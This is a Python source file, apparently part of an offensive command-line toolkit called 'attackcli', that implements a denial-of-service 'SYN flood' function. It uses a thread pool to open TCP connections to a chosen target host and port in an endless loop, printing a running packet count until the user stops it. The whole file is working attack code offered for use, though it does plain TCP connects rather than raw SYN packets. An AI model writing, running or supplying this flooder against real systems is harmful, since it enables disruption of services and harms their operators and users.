import socket
import time

import typer
from rich.progress import Progress, SpinnerColumn

from attackcli.utils.thread_exec import ThreadedExecutor


def _syn_once(target: str, port: int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((target, port))
        sock.close()
    except socket.error:
        pass


def syn_flood_attack(target: str, port: int, workers: int) -> None:
    typer.echo(typer.style("[!] To stop Press CTRL+C to stop it.", fg=typer.colors.WHITE, bold=True))
    executor = ThreadedExecutor(max_workers=workers)
    executor.start()

    max_queue_size = 1000
    packets_sent = 0
    log_interval = 50

    try:
        with Progress(SpinnerColumn(), transient=False) as progress:
            task = progress.add_task("[cyan]Sending packets...", start=True)

            while True:
                if executor.tasks.qsize() < max_queue_size:
                    executor.submit(_syn_once, target, port)
                    packets_sent += 1
                    progress.advance(task)
                    if packets_sent % log_interval == 0:
                        progress.console.print(f"[green][+] Sent {packets_sent} packets to {target}:{port}[/green]")
                else:
                    time.sleep(0.1)

                time.sleep(0.005)

    except KeyboardInterrupt:
        executor.wait()
